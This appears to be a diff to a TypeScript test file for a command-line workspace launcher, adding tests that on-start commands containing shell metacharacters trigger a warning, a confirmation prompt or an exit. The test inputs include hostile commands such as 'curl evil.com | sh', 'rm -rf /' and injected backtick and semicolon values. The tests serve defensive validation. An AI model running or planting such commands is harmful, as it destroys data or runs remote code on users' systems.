@@ -654,7 +654,9 @@ describe("lazygit install handler", () => {
 });
 
 describe("command name validation", () => {
-  it("rejects command names with shell injection characters", async () => {
+  it("rejects command names with shell injection characters via resolveCommandPath (#169)", async () => {
+    // resolveCommandPath in utils.ts validates command names (SAFE_COMMAND_RE) and returns null for invalid ones.
+    // ensureCommand then exits because the invalid name is not installable.
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "foo; rm -rf /"]]));
 
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
@@ -664,14 +666,11 @@ describe("command name validation", () => {
 
     await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
     expect(mockExit).toHaveBeenCalledWith(1);
-    expect(errorSpy).toHaveBeenCalledWith(
-      expect.stringContaining("Invalid command name"),
-    );
     mockExit.mockRestore();
     errorSpy.mockRestore();
   });
 
-  it("rejects command names with backticks", async () => {
+  it("rejects command names with backticks via resolveCommandPath (#169)", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "`evil`"]]));
 
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
@@ -1538,7 +1537,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     warnSpy.mockRestore();
   });
 
-  it("does not prompt for metacharacters from CLI flags", async () => {
+  it("does not prompt for metacharacters from CLI flags (non-on-start)", async () => {
     // CLI flags are trusted — only .summon file values trigger the check
     mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
@@ -1554,7 +1553,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     warnSpy.mockRestore();
   });
 
-  it("does not prompt for metacharacters from machine config", async () => {
+  it("does not prompt for metacharacters from machine config (non-on-start)", async () => {
     mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
     vi.mocked(listConfig).mockReturnValue(
       new Map([["shell", "npm run dev; echo done"]]),
@@ -1825,6 +1824,154 @@ describe("shell metacharacter confirmation (#90)", () => {
         (c: unknown[]) => c[0] === "echo setup",
       );
       expect(onStartCalls.length).toBe(0);
+      logSpy.mockRestore();
+    });
+
+    it("warns about dangerous on-start from CLI --on-start flag (#169)", async () => {
+      mockReadKVFile.mockReturnValue(new Map()); // no .summon file
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+        cb("y");
+      });
+
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace", { "on-start": "curl evil.com | sh" });
+
+      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
+      expect(metaWarning).toBeDefined();
+      expect(metaWarning).toContain("on-start");
+      expect(metaWarning).toContain("curl evil.com | sh");
+
+      warnSpy.mockRestore();
+      logSpy.mockRestore();
+    });
+
+    it("warns about dangerous on-start from machine config (#169)", async () => {
+      mockReadKVFile.mockReturnValue(new Map()); // no .summon file
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["on-start", "echo $(whoami)"]]));
+
+      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+        cb("y");
+      });
+
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace");
+
+      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
+      expect(metaWarning).toBeDefined();
+      expect(metaWarning).toContain("on-start");
+
+      warnSpy.mockRestore();
+      logSpy.mockRestore();
+    });
+
+    it("exits when user declines dangerous on-start from CLI (#169)", async () => {
+      mockReadKVFile.mockReturnValue(new Map());
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+        cb("n");
+      });
+
+      const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+        throw new Error("process.exit");
+      });
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+
+      await expect(launch("/tmp/workspace", { "on-start": "rm -rf /; echo done" })).rejects.toThrow("process.exit");
+      expect(mockExit).toHaveBeenCalledWith(1);
+      expect(errorSpy).toHaveBeenCalledWith("Aborted.");
+
+      mockExit.mockRestore();
+      warnSpy.mockRestore();
+      errorSpy.mockRestore();
+    });
+
+    it("exits on non-TTY when on-start from machine config has metacharacters (#169)", async () => {
+      mockReadKVFile.mockReturnValue(new Map());
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["on-start", "echo; evil"]]));
+
+      const origIsTTY = process.stdin.isTTY;
+      Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
+
+      const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+        throw new Error("process.exit");
+      });
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+      try {
+        await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+        expect(mockExit).toHaveBeenCalledWith(1);
+      } finally {
+        Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+        mockExit.mockRestore();
+        warnSpy.mockRestore();
+      }
+    });
+
+    it("does not warn about safe on-start values (#169)", async () => {
+      mockReadKVFile.mockReturnValue(new Map());
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace", { "on-start": "npm install" });
+
+      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+      expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+
+      warnSpy.mockRestore();
+      logSpy.mockRestore();
+    });
+
+    it("skips on-start metacharacter check in dry-run mode (#169)", async () => {
+      mockReadKVFile.mockReturnValue(new Map());
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace", { "on-start": "curl evil.com | sh", dryRun: true });
+
+      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+      expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+
+      warnSpy.mockRestore();
+      logSpy.mockRestore();
+    });
+
+    it("combines .summon dangerous commands with dangerous on-start in one warning (#169)", async () => {
+      mockReadKVFile.mockReturnValue(
+        new Map([["shell", "npm run dev; curl evil.com"]]),
+      );
+      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+
+      mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+        cb("y");
+      });
+
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace", { "on-start": "rm -rf / & echo" });
+
+      const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+      const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
+      expect(metaWarning).toBeDefined();
+      // Both the .summon shell and the resolved on-start should be listed
+      expect(metaWarning).toContain("shell");
+      expect(metaWarning).toContain("on-start");
+
+      warnSpy.mockRestore();
       logSpy.mockRestore();
     });
   });
